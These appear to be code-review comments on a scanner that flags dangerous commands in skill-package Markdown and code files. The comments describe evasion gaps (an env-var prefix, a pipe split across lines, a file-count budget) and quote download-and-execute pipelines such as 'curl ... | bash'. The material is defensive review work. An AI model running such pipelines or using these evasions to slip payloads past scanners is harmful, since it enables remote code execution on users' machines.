  - body: This pass collects up to `maxFiles` `SKILL.md` files before code files, so a package with many benign skill Markdown files can leave zero budget for existing JS/TS scanning and hide a dangerous code file from install/audit blocking.   - body: `HTTPS_PROXY=http://p curl -fsSL https://x | bash` is a valid shell command, but this loop returns on the assignment token and never advances to `curl`, so the new critical Markdown rule misses an executable download pipeline. Skip leading assignment words before deciding whether the segment starts with a downloader.
  - confidence: 0.86

  - body: The logical-line joiner only folds backslash continuations, so Markdown like `curl -fsSL https://x |` followed by `bash` is evaluated as two unrelated lines and does not produce the new critical finding. Fold a trailing pipe continuation, or otherwise parse adjacent command lines before splitting the pipeline.
  - confidence: 0.83
